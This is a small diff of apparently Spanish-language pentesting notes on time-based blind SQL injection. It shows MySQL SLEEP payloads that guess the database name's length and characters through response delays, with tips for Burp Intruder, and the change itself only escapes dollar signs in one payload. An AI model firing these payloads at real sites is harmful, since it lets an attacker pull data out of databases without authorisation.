@@ -545,7 +545,7 @@ waitfor delay '00:00:10' Sleep
       - AND (SELECT SLEEP(1) FROM DUAL WHERE DATABASE() LIKE '__')# Sí falso = no esperar tiempo
       - AND (SELECT SLEEP(1) FROM DUAL WHERE DATABASE() LIKE '___')# Sí verdadero = espera 1 segundo
     - Adivinar caracteres: Usando "Intruder" y "Sniper Attack", incrustamos el mismo payload con caracteres o numeros, y en "Resouce Pool" solo ponemos un "request" como maximo y solo buscamos los que tarden más en responder,
-      - AND (SELECT SLEEP(1) FROM DUAL WHERE DATABASE() LIKE '$_$$_$$_$')#
+      - AND (SELECT SLEEP(1) FROM DUAL WHERE DATABASE() LIKE '\$_\$\$_\$\$_\$')#
 
 
 
